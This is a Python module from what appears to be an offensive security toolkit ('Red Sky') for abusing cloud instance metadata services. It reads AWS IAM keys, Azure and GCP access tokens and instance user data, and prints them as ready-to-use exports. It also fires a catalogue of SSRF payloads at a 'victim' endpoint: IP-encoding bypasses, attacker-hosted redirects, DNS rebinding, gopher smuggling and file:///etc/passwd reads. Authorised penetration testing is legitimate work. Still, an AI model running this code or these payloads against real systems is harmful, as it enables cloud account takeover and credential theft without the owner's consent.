# language: Python, file: Program/cloud/metadata.py, target: Red Sky cloud — IMDS abuse
# Instance Metadata Service abuse across all three major clouds, plus the
# generic SSRF playbook. Two modes:
#   probe   -- hit IMDS from this host (in-cloud only). Tries all three.
#   ssrf    -- generate SSRF payloads for a user-supplied vulnerable endpoint.
#              Fires them and, if the target reflects, extracts IMDS responses.

import base64
import json
import sys
import time
from pathlib import Path
from typing import Dict, List, Optional
from urllib.parse import quote, urljoin

import requests

from Program.theme.palette import SCARLET, ARTERY, BONE, ASH, OK, CLOT, RESET, BOLD
from Program.utils import print_ok, print_err, print_info, print_warn, print_kv
from Program.utils.paths import OUTPUT_DIR


CLOUD_DIR = OUTPUT_DIR / "cloud"
META_DIR = CLOUD_DIR / "metadata"
META_DIR.mkdir(parents=True, exist_ok=True)


# ── IMDS endpoints per cloud ──
AWS_IMDS = "http://169.254.169.254"
AZURE_IMDS = "http://169.254.169.254"
GCP_METADATA = "http://metadata.google.internal"
DIGITALOCEAN = "http://169.254.169.254"
ALIBABA = "http://100.100.100.200"


# ── AWS IMDSv1 + IMDSv2 helpers ──
def aws_imdsv2_token(timeout: float = 2.0) -> Optional[str]:
    try:
        r = requests.put(AWS_IMDS + "/latest/api/token",
                         headers={"X-aws-ec2-metadata-token-ttl-seconds": "21600"},
                         timeout=timeout)
        if r.status_code == 200:
            return r.text
    except Exception:
        pass
    return None


def aws_probe(timeout: float = 3.0) -> Dict:
    result = {"cloud": "aws", "reachable": False, "imdsv2": False, "iam": {}, "identity": {}, "userdata": ""}

    # IMDSv2 first
    token = aws_imdsv2_token(timeout)
    headers = {"X-aws-ec2-metadata-token": token} if token else {}
    if token:
        result["imdsv2"] = True

    # identity doc
    try:
        r = requests.get(AWS_IMDS + "/latest/dynamic/instance-identity/document",
                         headers=headers, timeout=timeout)
        if r.status_code == 200:
            result["identity"] = r.json()
            result["reachable"] = True
    except Exception:
        pass

    # if IMDSv1 is enabled (no token required), we can read the IAM creds
    try:
        r = requests.get(AWS_IMDS + "/latest/meta-data/iam/security-credentials/",
                         headers=headers, timeout=timeout)
        if r.status_code == 200 and r.text.strip():
            role = r.text.strip().splitlines()[0]
            cr = requests.get(AWS_IMDS + "/latest/meta-data/iam/security-credentials/" + role,
                              headers=headers, timeout=timeout)
            if cr.status_code == 200:
                result["iam"] = cr.json()
                result["iam"]["RoleName"] = role
            result["reachable"] = True
    except Exception:
        pass

    # user data — often contains bootstrap secrets
    try:
        r = requests.get(AWS_IMDS + "/latest/user-data", headers=headers, timeout=timeout)
        if r.status_code == 200:
            result["userdata"] = r.text[:4096]
    except Exception:
        pass

    return result


# ── Azure IMDS ──
def azure_probe(timeout: float = 3.0) -> Dict:
    result = {"cloud": "azure", "reachable": False, "token": {}, "instance": {}}
    try:
        r = requests.get(AZURE_IMDS + "/metadata/instance?api-version=2021-02-01",
                         headers={"Metadata": "true"}, timeout=timeout)
        if r.status_code == 200:
            result["instance"] = r.json()
            result["reachable"] = True
    except Exception:
        pass
    try:
        r = requests.get(AZURE_IMDS + "/metadata/identity/oauth2/token",
                         params={"api-version": "2018-02-01",
                                 "resource": "https://management.azure.com/"},
                         headers={"Metadata": "true"}, timeout=timeout)
        if r.status_code == 200:
            result["token"] = r.json()
            result["reachable"] = True
    except Exception:
        pass
    return result


# ── GCP metadata ──
def gcp_probe(timeout: float = 3.0) -> Dict:
    result = {"cloud": "gcp", "reachable": False, "instance": {}, "tokens": {}}
    hdr = {"Metadata-Flavor": "Google"}
    try:
        r = requests.get(GCP_METADATA + "/computeMetadata/v1/instance/?recursive=true",
                         headers=hdr, timeout=timeout)
        if r.status_code == 200:
            result["instance"] = r.json()
            result["reachable"] = True
    except Exception:
        pass
    try:
        r = requests.get(GCP_METADATA + "/computeMetadata/v1/instance/service-accounts/",
                         headers=hdr, timeout=timeout)
        if r.status_code == 200:
            for acct in [a.strip("/") for a in r.text.splitlines() if a.strip()]:
                tr = requests.get(GCP_METADATA + "/computeMetadata/v1/instance/service-accounts/" + acct + "/token",
                                  headers=hdr, timeout=timeout)
                if tr.status_code == 200:
                    result["tokens"][acct] = tr.json()
                    result["reachable"] = True
    except Exception:
        pass
    return result


# ── all-in-one probe ──
def cmd_probe(out_file: str) -> int:
    print_info("cloud IMDS probe — checking this host for each cloud's metadata service")
    print()

    all_results = {}
    for name, fn in (("aws", aws_probe), ("azure", azure_probe), ("gcp", gcp_probe)):
        print("  " + ASH + "checking " + name + " ..." + RESET, end="\r")
        r = fn()
        all_results[name] = r
        if r.get("reachable"):
            print("  " + SCARLET + "▓" + RESET + " " + BONE + name + RESET + "  "
                  + ASH + "REACHABLE" + RESET + "        ")
        else:
            print("  " + ASH + "░ " + name + "  not reachable" + RESET + "        ")

    print()

    # dump details per cloud
    for cloud, r in all_results.items():
        if not r.get("reachable"):
            continue
        print(ARTERY + BOLD + "── " + cloud.upper() + RESET)
        if cloud == "aws":
            id_doc = r.get("identity", {})
            print_kv("account", id_doc.get("accountId", ""))
            print_kv("region", id_doc.get("region", ""))
            print_kv("instanceId", id_doc.get("instanceId", ""))
            print_kv("instanceType", id_doc.get("instanceType", ""))
            print_kv("imdsv2", "yes" if r.get("imdsv2") else "no")
            iam = r.get("iam", {})
            if iam:
                print()
                print_ok("IAM credentials")
                print_kv("role", iam.get("RoleName", ""))
                print_kv("AccessKeyId", iam.get("AccessKeyId", ""))
                print_kv("Expiration", iam.get("Expiration", ""))
                print()
                print("export AWS_ACCESS_KEY_ID=" + iam.get("AccessKeyId", ""))
                print("export AWS_SECRET_ACCESS_KEY=" + iam.get("SecretAccessKey", ""))
                print("export AWS_SESSION_TOKEN=" + iam.get("Token", ""))
            if r.get("userdata"):
                print()
                print_info("user data (first 500 chars)")
                print("  " + CLOT + r["userdata"][:500] + RESET)
        elif cloud == "azure":
            inst = r.get("instance", {}).get("compute", {})
            print_kv("name", inst.get("name", ""))
            print_kv("resourceGroup", inst.get("resourceGroupName", ""))
            print_kv("subscription", inst.get("subscriptionId", ""))
            print_kv("location", inst.get("location", ""))
            tok = r.get("token", {})
            if tok:
                print()
                print_ok("managed identity token")
                print_kv("expires_on", tok.get("expires_on", ""))
                print("access_token: " + tok.get("access_token", "")[:80] + "...")
        elif cloud == "gcp":
            inst = r.get("instance", {})
            print_kv("name", inst.get("name", ""))
            print_kv("zone", inst.get("zone", "").split("/")[-1])
            for acct, tok in r.get("tokens", {}).items():
                print()
                print_ok("token for " + acct)
                print("access_token: " + tok.get("access_token", "")[:80] + "...")
        print()

    out = Path(out_file) if out_file else META_DIR / ("probe_" + str(int(time.time())) + ".json")
    out.write_text(json.dumps(all_results, indent=2))
    print_kv("saved", out)
    return 0


# ── SSRF payload generator ──
SSRF_PAYLOADS = [
    # direct
    ("direct-aws-role-list",  "http://169.254.169.254/latest/meta-data/iam/security-credentials/"),
    ("direct-aws-identity",   "http://169.254.169.254/latest/dynamic/instance-identity/document"),
    ("direct-aws-userdata",   "http://169.254.169.254/latest/user-data"),
    ("direct-azure-token",    "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"),
    ("direct-gcp-token",      "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"),
    ("direct-gcp-project",    "http://metadata.google.internal/computeMetadata/v1/project/project-id"),

    # decimal / hex / octal IP bypasses
    ("decimal-ip",            "http://2852039166/latest/meta-data/iam/security-credentials/"),
    ("hex-ip",                "http://0xA9FEA9FE/latest/meta-data/iam/security-credentials/"),
    ("octal-ip",              "http://0251.0376.0251.0376/latest/meta-data/iam/security-credentials/"),

    # redirect abuse (you host a 302 to the metadata endpoint)
    ("redirect-gcp",          "http://YOUR_HOST/redirect?url=http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"),
    ("redirect-aws",          "http://YOUR_HOST/redirect?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"),

    # DNS rebinding domain (you register a domain whose DNS alternates between
    # your attacker IP and 169.254.169.254)
    ("dns-rebind",            "http://rebind.YOUR_DOMAIN/latest/meta-data/iam/security-credentials/"),

    # header injection (server-side — some clients accept these)
    ("header-x-forwarded",    "http://169.254.169.254/latest/meta-data/iam/security-credentials/"),

    # protocol smuggling
    ("gopher-aws",            "gopher://169.254.169.254:80/_GET /latest/meta-data/iam/security-credentials/ HTTP/1.1%0d%0aHost: 169.254.169.254%0d%0a%0d%0a"),
    ("dict-aws",              "dict://169.254.169.254:80/latest/meta-data/iam/security-credentials/"),

    # AWS IMDSv2 bypass attempts (some libraries strip headers)
    ("imdsv2-header",         "http://169.254.169.254/latest/meta-data/iam/security-credentials/"),
    ("imdsv2-put-token",      "http://169.254.169.254/latest/api/token"),

    # Azure requires Metadata:true
    ("azure-header",          "http://169.254.169.254/metadata/instance?api-version=2021-02-01"),

    # GCP requires Metadata-Flavor:Google
    ("gcp-header",            "http://metadata.google.internal/computeMetadata/v1/project/project-id"),

    # file:// abuse
    ("file-etc-passwd",       "file:///etc/passwd"),

    # cloud provider IPv6 addresses
    ("ipv6-aws",              "http://[fd00:ec2::254]/latest/meta-data/iam/security-credentials/"),
    ("ipv6-azure",            "http://[fe80::a9fe:a9fe]/metadata/instance?api-version=2021-02-01"),
]


def cmd_ssrf(target: str, param: str, out_file: str) -> int:
    """Given a URL that has an SSRF-prone parameter (e.g. /proxy?url=X), fire
    every payload variant and report which one got a real response back."""
    if not target:
        print_err("--target URL required (e.g. 'http://victim/api/proxy?url=FUZZ')")
        return 2
    if "FUZZ" not in target:
        print_err("target must contain FUZZ placeholder")
        return 2

    print_info("SSRF payload generator")
    print_kv("target", target)
    print()
    print_info(str(len(SSRF_PAYLOADS)) + " payload variants")
    print()

    results = []
    for name, payload in SSRF_PAYLOADS:
        # URL-encode the payload for the query string
        url = target.replace("FUZZ", quote(payload, safe=""))
        print("  " + ASH + "[" + name + "]" + RESET + " ", end="")
        try:
            r = requests.get(url, timeout=10, allow_redirects=False)
            snippet = r.text[:150].replace("\n", " ")
            mark = SCARLET + "HIT" if r.status_code == 200 and len(r.text) > 20 else ASH + "miss"
            print(mark + RESET + "  " + BONE + str(r.status_code) + RESET + "  "
                  + CLOT + snippet + RESET)
            results.append({
                "name": name, "payload": payload, "status": r.status_code,
                "response": r.text[:4096], "hit": r.status_code == 200 and len(r.text) > 20,
            })
        except Exception as e:
            print(ASH + "err" + RESET + "  " + str(e)[:80])
            results.append({"name": name, "payload": payload, "error": str(e)})
        time.sleep(0.2)

    print()
    hits = [r for r in results if r.get("hit")]
    print_kv("hits", str(len(hits)) + "/" + str(len(results)))
    for h in hits:
        print()
        print(SCARLET + "▓ " + h["name"] + RESET)
        print("  " + ASH + "payload: " + RESET + h["payload"])
        print("  " + CLOT + h["response"][:300].replace("\n", " ") + RESET)

    out = Path(out_file) if out_file else META_DIR / ("ssrf_" + str(int(time.time())) + ".json")
    out.write_text(json.dumps(results, indent=2))
    print()
    print_kv("saved", out)
    return 0


def cmd_payloads(out_file: str) -> int:
    print_info(str(len(SSRF_PAYLOADS)) + " SSRF payloads")
    print()
    for name, payload in SSRF_PAYLOADS:
        print(SCARLET + "* " + RESET + BONE + name.ljust(22) + RESET + "  "
              + CLOT + payload[:100] + RESET)

    out = Path(out_file) if out_file else META_DIR / ("payloads_" + str(int(time.time())) + ".json")
    out.write_text(json.dumps(SSRF_PAYLOADS, indent=2))
    print()
    print_kv("saved", out)
    return 0


def run_cli(args):
    import argparse
    p = argparse.ArgumentParser(prog="redsky cloud metadata", add_help=False)
    p.add_argument("-h", "--help", action="store_true")
    p.add_argument("action", nargs="?", default="probe",
                   choices=["probe", "ssrf", "payloads"])
    p.add_argument("--target", default="")
    p.add_argument("--param", default="url")
    p.add_argument("--out", default="")

    try:
        ns = p.parse_args(args)
    except SystemExit:
        print_err("usage: redsky cloud metadata <probe|ssrf|payloads> [opts]")
        return 2

    if ns.help:
        print_info("probe                              -- hit IMDS from this host (in-cloud)")
        print_info("ssrf --target 'http://v/api?url=FUZZ'  -- fire SSRF payloads at a target")
        print_info("payloads                           -- show the SSRF payload catalog")
        return 0

    if ns.action == "probe":
        return cmd_probe(ns.out)
    if ns.action == "ssrf":
        return cmd_ssrf(ns.target, ns.param, ns.out)
    if ns.action == "payloads":
        return cmd_payloads(ns.out)
    return 2


if __name__ == "__main__":
    sys.exit(run_cli(sys.argv[1:]))
